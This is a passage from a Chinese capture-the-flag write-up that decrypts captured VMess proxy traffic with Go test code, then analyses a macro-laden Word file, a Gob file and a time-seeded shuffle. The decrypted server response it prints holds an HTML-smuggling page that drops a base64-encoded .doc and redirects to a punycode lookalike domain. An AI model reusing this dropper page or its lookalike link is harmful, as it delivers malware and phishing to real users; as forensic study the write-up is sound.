class="hljs-property">Reader</span>, transferType protocol.<span class="hljs-property">TransferType</span>, paddingLen <span class="hljs-title class_">PaddingLengthGenerator</span>) *<span class="hljs-title class_">AuthenticationReader</span> &#123;<br>r := &amp;<span class="hljs-title class_">AuthenticationReader</span>&#123;<br><span class="hljs-attr">auth</span>:         auth,<br><span class="hljs-attr">sizeParser</span>:   sizeParser,<br><span class="hljs-attr">transferType</span>: transferType,<br><span class="hljs-attr">padding</span>:      paddingLen,<br><span class="hljs-attr">sizeBytes</span>:    <span class="hljs-title function_">make</span>([]byte, sizeParser.<span class="hljs-title class_">SizeBytes</span>()),<br>&#125;<br><span class="hljs-keyword">if</span> breader, ok := reader.(*buf.<span class="hljs-property">BufferedReader</span>); ok &#123;<br>r.<span class="hljs-property">reader</span> = breader<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>r.<span class="hljs-property">reader</span> = &amp;buf.<span class="hljs-property">BufferedReader</span>&#123;<span class="hljs-title class_">Reader</span>: buf.<span class="hljs-title class_">NewReader</span>(reader)&#125;<br>&#125;<br><span class="hljs-keyword">return</span> r<br>&#125;<br><br><span class="hljs-comment">//这里把所有需要加密的信息行了封装</span><br>type <span class="hljs-title class_">AuthenticationReader</span> struct &#123;<br>auth         <span class="hljs-title class_">Authenticator</span> <span class="hljs-comment">//跟进去发现,这里是就是定义解密类型的 GCM不用管</span><br>reader       *buf.<span class="hljs-property">BufferedReader</span> <span class="hljs-comment">//数据传入定义</span><br>sizeParser   <span class="hljs-title class_">ChunkSizeDecoder</span>  <span class="hljs-comment">// // ChunkSizeDecoder is a utility class to decode size value from bytes.</span><br>sizeBytes    []byte<br>transferType protocol.<span class="hljs-property">TransferType</span><br>padding      <span class="hljs-title class_">PaddingLengthGenerator</span><br>size         uint16<br>paddingLen   uint16<br>hasSize      bool<br>done         bool<br>&#125;<br><br><span class="hljs-comment">//追踪一下 Authenticator这个结构体,很显然这个Open函数是解密函数,找到这个调用Open的地方非常重要</span><br>type <span class="hljs-title class_">Authenticator</span> interface &#123;<br><span class="hljs-title class_">NonceSize</span>() int<br><span class="hljs-title class_">Overhead</span>() int<br><span class="hljs-title class_">Open</span>(dst, cipherText []byte) ([]byte, error)<br><span class="hljs-title class_">Seal</span>(dst, plainText []byte) ([]byte, error)<br>&#125;<br><br>&#125;<br><span class="hljs-comment">//在readInternal()发现调用了该函数</span><br></code></pre></td></tr></table></figure><p>这个时候我们再回顾一下,在上述<strong>DecodeRequestBody</strong>函数中其实只用到了<strong>3</strong>个需要传入的参数(requestbodykey、requestbodyiv、<strong>request.Command.TransferType()</strong>) </p><p><strong>所以我们完全可以直接利用源码中的函数,直接解密!</strong></p><p>解码脚本如下: 下面可以直接放入上述github项目中 <strong>&#x2F;vmess&#x2F;proxy&#x2F;encoding&#x2F;encoding_test.go</strong>中使用</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs jsx">func <span class="hljs-title class_">TestDecodeReqbody</span>(t *testing.<span class="hljs-property">T</span>) &#123;<br><br><span class="hljs-comment">//指令头里的数据加密key 传入参数key</span><br><span class="hljs-keyword">var</span> key [<span class="hljs-number">16</span>]byte<br>s := []<span class="hljs-title function_">byte</span>(<span class="hljs-string">&quot;5e4a9aa9ba58c7e3ad36fe2499dca259&quot;</span>)<br>_, _ = hex.<span class="hljs-title class_">Decode</span>(key[:], s)<br><br><span class="hljs-comment">//指令头里的数据加密iv 传入参数i</span><br><span class="hljs-keyword">var</span> iv [<span class="hljs-number">16</span>]byte<br>b := []<span class="hljs-title function_">byte</span>(<span class="hljs-string">&quot;13277f5732da52ada790d87b8829daa9&quot;</span>)<br>_, _ = hex.<span class="hljs-title class_">Decode</span>(iv[:], b)<br><br>dat, _ := os.<span class="hljs-title class_">ReadFile</span>(<span class="hljs-string">&quot;/Users/yuan/Downloads/4dd1.bin&quot;</span>) <span class="hljs-comment">//第一个数据包data数据</span><br><span class="hljs-comment">//这里我们去从第71个字节开始 上述Auth部分有16个字节, 指令部分有55个字节,所以从71开始.</span><br>  <span class="hljs-comment">//根据标准格式中 71-73 为2字节长度,73之后为数据包</span><br>r := bytes.<span class="hljs-title class_">NewReader</span>(dat[<span class="hljs-number">71</span>:])<br><br><span class="hljs-comment">//使用ChunkMasking模式</span><br><span class="hljs-keyword">var</span> sizeParser crypto.<span class="hljs-property">ChunkSizeDecoder</span> = crypto.<span class="hljs-property">PlainChunkSizeParser</span>&#123;&#125;<br>sizeParser = <span class="hljs-title class_">NewShakeSizeParser</span>(iv[:])<br><span class="hljs-comment">//使用Padding模式</span><br><span class="hljs-keyword">var</span> padding crypto.<span class="hljs-property">PaddingLengthGenerator</span><br>padding = sizeParser.(crypto.<span class="hljs-property">PaddingLengthGenerator</span>)<br><br><span class="hljs-comment">//传入key</span><br>aead := crypto.<span class="hljs-title class_">NewAesGcm</span>(**key[:]**)<br><br>auth := &amp;crypto.<span class="hljs-property">AEADAuthenticator</span>&#123;<br><span class="hljs-attr">AEAD</span>:                    aead,<br><span class="hljs-title class_">NonceGenerator</span>:          <span class="hljs-title class_">GenerateChunkNonce</span>(iv[:], <span class="hljs-title function_">uint32</span>(aead.<span class="hljs-title class_">NonceSize</span>())),<br><span class="hljs-title class_">AdditionalDataGenerator</span>: crypto.<span class="hljs-title class_">GenerateEmptyBytes</span>(),<br>&#125;<br><br>bodyReader := crypto.<span class="hljs-title class_">NewAuthenticationReader</span>(auth, sizeParser, r, <span class="hljs-number">0</span>, padding)<br><br>  <span class="hljs-comment">//接下来这部分,大家可以自己去试试找到ReadMultiBuffer</span><br><span class="hljs-comment">//大概过程就是,因为DecodeRequestBody只是将所有加密的信息传入到结构体中,并没有进行真正的解密</span><br><span class="hljs-comment">//在找到谁调用了DecodeRequestBody,下面一行就是进行解密并复制值,buf.copy()</span><br><span class="hljs-comment">//bodyReader := session.DecodeResponseBody(request, reader)</span><br><span class="hljs-comment">//return buf.Copy(bodyReader, output, buf.UpdateActivity(timer)) 跟进找哪里调用了bodyReader即可</span><br><span class="hljs-comment">//为什么循环,是因为MultiBuffer()只选择了部分数据进行解密,要循环解密,循环输出.</span><br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">1000</span>; i++ &#123;<br><br>buffer_1, _ := bodyReader.<span class="hljs-title class_">ReadMultiBuffer</span>()<br><span class="hljs-keyword">if</span> buffer_1.<span class="hljs-title class_">IsEmpty</span>() &#123;<br><span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;失败！&quot;</span>)<br><span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;解密结束！&quot;</span>)<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-title function_">println</span>(buffer_1.<span class="hljs-title class_">String</span>())<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-variable constant_">GET</span> /out <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">5000</span><br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: curl/<span class="hljs-number">7.75</span><span class="hljs-number">.0</span><br><span class="hljs-title class_">Accept</span>: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Connection: close</span><br></code></pre></td></tr></table></figure></li><li><p>解密ResponseHeader部分</p><p>这部分比较容易,就四个字节,官方文档没有什么问题</p><p><img src="/../imgs/20220731/Untitled%208.png" alt="Untitled"></p><p>这部分的作用就是确定实际应答的数据位置,所以直接AES-128-CFB key iv 直接解</p><p>附上代码:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs jsx">func <span class="hljs-title class_">TestDecodeResHeader</span>(t *testing.<span class="hljs-property">T</span>) &#123;<br><br><span class="hljs-comment">////Key 为 MD5(数据加密 Key)。</span><br><span class="hljs-keyword">var</span> key [<span class="hljs-number">16</span>]byte<br>s := []<span class="hljs-title function_">byte</span>(<span class="hljs-string">&quot;5e4a9aa9ba58c7e3ad36fe2499dca259&quot;</span>)<br>_, _ = hex.<span class="hljs-title class_">Decode</span>(key[:], s)<br>md5hash_key := md5.<span class="hljs-title class_">New</span>()<br>md5hash_key.<span class="hljs-title class_">Write</span>(key[:])<br>md5key := md5hash_key.<span class="hljs-title class_">Sum</span>(nil)[:]<br>fmt.<span class="hljs-title class_">Println</span>(hex.<span class="hljs-title class_">EncodeToString</span>(md5key))<br><br><span class="hljs-keyword">var</span> iv [<span class="hljs-number">16</span>]byte<br>b := []<span class="hljs-title function_">byte</span>(<span class="hljs-string">&quot;13277f5732da52ada790d87b8829daa9&quot;</span>)<br>_, _ = hex.<span class="hljs-title class_">Decode</span>(iv[:], b)<br>md5hash_iv := md5.<span class="hljs-title class_">New</span>()<br>md5hash_iv.<span class="hljs-title class_">Write</span>(iv[:])<br>md5iv := md5hash_iv.<span class="hljs-title class_">Sum</span>(nil)[:]<br>fmt.<span class="hljs-title class_">Println</span>(hex.<span class="hljs-title class_">EncodeToString</span>(md5iv))<br><br>block, _ := aes.<span class="hljs-title class_">NewCipher</span>(md5key[:])<br>stream := cipher.<span class="hljs-title class_">NewCFBDecrypter</span>(block, md5iv[:])<br>dat, _ := os.<span class="hljs-title class_">ReadFile</span>(<span class="hljs-string">&quot;/Users/yuan/Downloads/ae71.bin&quot;</span>) <span class="hljs-comment">//整个数据包</span><br>buf := <span class="hljs-title function_">make</span>([]byte, <span class="hljs-title function_">len</span>(dat[:<span class="hljs-number">32</span>]))<br>stream.<span class="hljs-title class_">XORKeyStream</span>(buf, dat[:<span class="hljs-number">32</span>])<br>fmt.<span class="hljs-title class_">Println</span>(hex.<span class="hljs-title class_">EncodeToString</span>(buf[:]))<br>&#125;<br><span class="hljs-comment">//解密结果前4个字节为 a2 00 00 00 所以,a2 对应我们指令部分的 响应认证 a2</span><br><br></code></pre></td></tr></table></figure><p>解密结果前4个字节为 <strong>a2 00 00 00</strong> 所以,a2 对应我们指令部分的 <strong>响应认证 a2</strong><br>指令长度为 <strong>00</strong> ,所以实际应答数据从 第四个字节开始</p></li><li><p>解密ResponseBody数据部分</p><p>这部分基本和requestbody的数据部分解密,一致,唯一不同的就是, key和iv 不同</p><p>代码定位: <a href="https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/encoding/client.go#L202">https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/encoding/client.go#L202</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsx">sizeParser = <span class="hljs-title class_">NewShakeSizeParser</span>(c.<span class="hljs-property">responseBodyIV</span>[:])<br>aead := crypto.<span class="hljs-title class_">NewAesGcm</span>(c.<span class="hljs-property">responseBodyKey</span>[:])<br></code></pre></td></tr></table></figure><p>不同的就是 从requestbodyIv和requestbodykey变成responsebodyiv和responsebodykey </p><p><strong>多做了一次MD5</strong></p><p>代码定位:<a href="https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/encoding/client.go#L51">https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/encoding/client.go#L51</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsx">session.<span class="hljs-property">ResponseBodyKey</span> = md5.<span class="hljs-title class_">Sum</span>(session.<span class="hljs-property">RequestBodyKey</span>[:])<br>session.<span class="hljs-property">ResponseBodyIV</span> = md5.<span class="hljs-title class_">Sum</span>(session.<span class="hljs-property">RequestBodyIV</span>[:])<br></code></pre></td></tr></table></figure><p>所以Response部分的数据解密代码如下</p><p>注意,数据只进行了一次加密, 然后分多次发出,后面的服务器响应包都是标准格式 [2字节长度 + 数据包]</p><p>所以修改后代码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs jsx">func <span class="hljs-title class_">TestDecodeRespbody</span>(t *testing.<span class="hljs-property">T</span>) &#123;<br><br><span class="hljs-keyword">var</span> key [<span class="hljs-number">16</span>]byte<br>s := []<span class="hljs-title function_">byte</span>(<span class="hljs-string">&quot;5e4a9aa9ba58c7e3ad36fe2499dca259&quot;</span>)<br>_, _ = hex.<span class="hljs-title class_">Decode</span>(key[:], s)<br><br><span class="hljs-keyword">var</span> iv [<span class="hljs-number">16</span>]byte<br>b := []<span class="hljs-title function_">byte</span>(<span class="hljs-string">&quot;13277f5732da52ada790d87b8829daa9&quot;</span>)<br>_, _ = hex.<span class="hljs-title class_">Decode</span>(iv[:], b)<br><br>responsekey := md5.<span class="hljs-title class_">Sum</span>(key[:])<br>responseiv := md5.<span class="hljs-title class_">Sum</span>(iv[:])<br>dat, _ := os.<span class="hljs-title class_">ReadFile</span>(<span class="hljs-string">&quot;/Users/yuan/Downloads/fwq.bin&quot;</span>) <span class="hljs-comment">//整个数据包</span><br><br><span class="hljs-comment">//因为前4个字节是response头</span><br>r := bytes.<span class="hljs-title class_">NewReader</span>(dat[<span class="hljs-number">4</span>:])<br>aead := crypto.<span class="hljs-title class_">NewAesGcm</span>(responsekey[:])<br><br><span class="hljs-keyword">var</span> sizeParser crypto.<span class="hljs-property">ChunkSizeDecoder</span> = crypto.<span class="hljs-property">PlainChunkSizeParser</span>&#123;&#125;<br>sizeParser = <span class="hljs-title class_">NewShakeSizeParser</span>(responseiv[:])<br><br><span class="hljs-keyword">var</span> padding crypto.<span class="hljs-property">PaddingLengthGenerator</span><br>padding = sizeParser.(crypto.<span class="hljs-property">PaddingLengthGenerator</span>)<br>auth := &amp;crypto.<span class="hljs-property">AEADAuthenticator</span>&#123;<br><span class="hljs-attr">AEAD</span>:                    aead,<br><span class="hljs-title class_">NonceGenerator</span>:          <span class="hljs-title class_">GenerateChunkNonce</span>(responseiv[:], <span class="hljs-title function_">uint32</span>(aead.<span class="hljs-title class_">NonceSize</span>())),<br><span class="hljs-title class_">AdditionalDataGenerator</span>: crypto.<span class="hljs-title class_">GenerateEmptyBytes</span>(),<br>&#125;<br>bodyReader := crypto.<span class="hljs-title class_">NewAuthenticationReader</span>(auth, sizeParser, r, <span class="hljs-number">0</span>, padding)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">1000</span>; i++ &#123;<br><br>buffer_1, _ := bodyReader.<span class="hljs-title class_">ReadMultiBuffer</span>()<br><span class="hljs-keyword">if</span> buffer_1.<span class="hljs-title class_">IsEmpty</span>() &#123;<br><span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;解密结束！&quot;</span>)<br><span class="hljs-keyword">break</span><br>&#125;<br>fo, _ := os.<span class="hljs-title class_">Create</span>(<span class="hljs-string">&quot;out.html&quot;</span>)<br>fo.<span class="hljs-title class_">Write</span>([]<span class="hljs-title function_">byte</span>(buffer_1.<span class="hljs-title class_">String</span>()))<br><span class="hljs-title function_">println</span>(buffer_1.<span class="hljs-title class_">String</span>())<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结果如下:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> <span class="hljs-variable constant_">OK</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Length</span>: <span class="hljs-number">1097547</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Disposition</span>: inline; filename=<span class="hljs-string">&quot;out.html&quot;</span><br><span class="hljs-title class_">Accept</span>-<span class="hljs-title class_">Ranges</span>: bytes<br><span class="hljs-title class_">ETag</span>: <span class="hljs-string">&quot;2c1e70fd6a7708efcc4a0f30821cd03ab8a58939&quot;</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br><span class="hljs-title class_">Vary</span>: <span class="hljs-title class_">Accept</span>-<span class="hljs-title class_">Encoding</span><br><span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Fri</span>, <span class="hljs-number">12</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">2021</span> <span class="hljs-number">06</span>:<span class="hljs-number">02</span>:<span class="hljs-number">42</span> <span class="hljs-variable constant_">GMT</span><br><span class="hljs-title class_">Connection</span>: close<br><br>&lt;body&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">function saveAs(blob, fileName) &#123;</span><br><span class="language-xml">    let url = window.URL.createObjectURL(blob);</span><br><span class="language-xml"></span><br><span class="language-xml">    let anchorElem = document.createElement(&#x27;a&#x27;);</span><br><span class="language-xml">    anchorElem.style = &#x27;display: none&#x27;;</span><br><span class="language-xml">    anchorElem.href = url;</span><br><span class="language-xml">    anchorElem.download = fileName;</span><br><span class="language-xml"></span><br><span class="language-xml">    document.body.appendChild(anchorElem);</span><br><span class="language-xml">    anchorElem.click();</span><br><span class="language-xml"></span><br><span class="language-xml">    document.body.removeChild(anchorElem);</span><br><span class="language-xml"></span><br><span class="language-xml">    // On Edge, revokeObjectURL should be called only after</span><br><span class="language-xml">    // a.click() has completed, atleast on EdgeHTML 15.15048</span><br><span class="language-xml">    setTimeout(function() &#123;</span><br><span class="language-xml">        window.URL.revokeObjectURL(url);</span><br><span class="language-xml">    &#125;, 1000);</span><br><span class="language-xml">&#125;</span><br><span class="language-xml"></span><br><span class="language-xml">(function() &#123;</span><br><span class="language-xml">    let byteCharacters = atob(&#x27;0M8R4KGxGuEAAAAAAAAAAAAAAAAAA...</span><br><span class="language-xml">....</span><br><span class="language-xml">...</span><br><span class="language-xml">..</span><br><span class="language-xml">let byteNumbers = new Array(byteCharacters.length);</span><br><span class="language-xml">    for (let i = 0; i &lt; byteCharacters.length; i++) &#123;</span><br><span class="language-xml">        byteNumbers[i] = byteCharacters.charCodeAt(i);</span><br><span class="language-xml">    &#125;</span><br><span class="language-xml">    let byteArray = new Uint8Array(byteNumbers);</span><br><span class="language-xml">    </span><br><span class="language-xml">    // now that we have the byte array, construct the blob from it</span><br><span class="language-xml">    let blob1 = new Blob([byteArray], &#123;type: &#x27;application/octet-stream&#x27;&#125;);</span><br><span class="language-xml"></span><br><span class="language-xml">    saveAs(blob1, &#x27;0208_54741869750132.doc&#x27;);</span><br><span class="language-xml"></span><br><span class="language-xml">&#125;)();</span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>&lt;<span class="hljs-regexp">/body&gt;&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0;url=https:/</span><span class="hljs-regexp">/key.xn--nvigators-key-if2g.com/</span>ktt/cmd/logon0208_54741869750132.<span class="hljs-property">doc</span><span class="hljs-string">&#x27;&gt;</span><br></code></pre></td></tr></table></figure><p>把atob里面的数据直接放到cyberchef中,发现是doc</p><p><img src="/../imgs/20220731/Untitled%209.png" alt="Untitled"></p></li></ol><h2 id="0x02-宏病毒"><a href="#0x02-宏病毒" class="headerlink" title="0x02 宏病毒"></a>0x02 宏病毒</h2><p>沙箱一波梭</p><p><img src="/../imgs/20220731/Untitled%2010.png" alt="Untitled"></p><p>解出压缩包密码为MD5(api.ipify.org)</p><h2 id="0x03-GOB文件解析"><a href="#0x03-GOB文件解析" class="headerlink" title="0x03 GOB文件解析"></a>0x03 GOB文件解析</h2><p>文件中字符串提示</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title class_">This</span> is a <span class="hljs-title class_">Gob</span> <span class="hljs-title class_">File</span>!<br></code></pre></td></tr></table></figure><blockquote><p>Gob 是Go 自己的以二进制形式序列化和反序列化程序数据的格式；可以在 encoding 包中找到。 这种格式的数据简称为Gob （即Go binary 的缩写）。 类似于Python 的”pickle” 和Java 的”Serialization”。</p></blockquote><p>简单看看:<a href="https://learnku.com/docs/the-way-to-go/1211-uses-gob-to-transmit-data/3671">https://learnku.com/docs/the-way-to-go/1211-uses-gob-to-transmit-data/3671</a></p><p><strong>如果要解析GOB文件,就必须知道其中的变量结构,定义结构后才会将数据解析出来,如果有就会解析出来,如果少了是不碍事的.</strong></p><p>发现在map[string][]byte下是有输出的 (只能一个个试爆破</p><p>代码如下:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jsx">func <span class="hljs-title class_">TestDecodeGob</span>(t *testing.<span class="hljs-property">T</span>) &#123;<br><br>network, _ := os.<span class="hljs-title class_">ReadFile</span>(<span class="hljs-string">&quot;/Users/yuan/Downloads/谍影重重附件/flag&quot;</span>)<br>r := bytes.<span class="hljs-title class_">NewReader</span>(network)<br>dec := gob.<span class="hljs-title class_">NewDecoder</span>(r)<br><br><span class="hljs-comment">//定义结构</span><br><span class="hljs-keyword">var</span> X map[string][]byte<br><span class="hljs-comment">//必须传入指针</span><br>err := dec.<span class="hljs-title class_">Decode</span>(&amp;X)<br><span class="hljs-keyword">if</span> err != nil &#123;<br>log.<span class="hljs-title class_">Fatal</span>(<span class="hljs-string">&quot;decode:&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">for</span> k, v := range X &#123;<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;key:&quot;</span>, <span class="hljs-title function_">string</span>([]<span class="hljs-title function_">byte</span>(k)), <span class="hljs-string">&quot;value:&quot;</span>, hex.<span class="hljs-title class_">EncodeToString</span>(v))<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-attr">key</span>: <span class="hljs-title class_">Gob</span> <span class="hljs-attr">value_hex</span>: 54686973206973206120476f622046696c6521 <span class="hljs-attr">valuestring</span>: <span class="hljs-title class_">This</span> is a <span class="hljs-title class_">Gob</span> <span class="hljs-title class_">File</span>!<br><span class="hljs-attr">key</span>: <span class="hljs-title class_">Time</span> <span class="hljs-attr">value_hex</span>: 323032322d30372d31392031343a34393a3536 <span class="hljs-attr">valuestring</span>: <span class="hljs-number">2022</span>-<span class="hljs-number">07</span>-<span class="hljs-number">19</span> <span class="hljs-number">14</span>:<span class="hljs-number">49</span>:<span class="hljs-number">56</span><br><span class="hljs-attr">key</span>: <span class="hljs-variable constant_">PNG</span> <span class="hljs-title class_">File</span> <span class="hljs-attr">value_hex</span>: f500212105b90084bfa4b286525d5e0107bfbe3f11a836ceb8d9a800745eaee725c4881e00d8bb3a9985e6ff3ae70a7defd55e6b00ae30f4b5479b8dc0f000366f06814962ef506b84ab003f843a9d3b5f67e93d14a74f1df3ce5f5da42ee2132786ccb78<br></code></pre></td></tr></table></figure><p>很显然这个pngfile的开头是不对应的,给了个Time,加上提示打乱顺序,很容易能想到是使用timestamp撒种子,算法</p><h2 id="0x04-洗牌算法打乱"><a href="#0x04-洗牌算法打乱" class="headerlink" title="0x04 洗牌算法打乱"></a>0x04 洗牌算法打乱</h2><p>网上搜索时间戳打乱算法 很容易会发现这个脚本 <a href="https://www.cnblogs.com/yourstars/p/15966229.html">https://www.cnblogs.com/yourstars/p/15966229.html</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jsx">package main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;math/rand&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br><br>func <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> arr = []uint64&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>&#125;<br>    rand.<span class="hljs-title class_">Seed</span>(time.<span class="hljs-title class_">Now</span>().<span class="hljs-title class_">UnixNano</span>()) <span class="hljs-comment">// 注意，这行重要，为了使每次洗牌的结果不一样，需要用不同的随机种子，我们这里用精确到微秒的时间戳</span><br>    rand.<span class="hljs-title class_">Shuffle</span>(<span class="hljs-title function_">len</span>(arr), <span class="hljs-title function_">func</span>(<span class="hljs-params">i, j int</span>) &#123;<br>        arr[i], arr[j] = arr[j], arr[i]<br>    &#125;)<br>    fmt.<span class="hljs-title 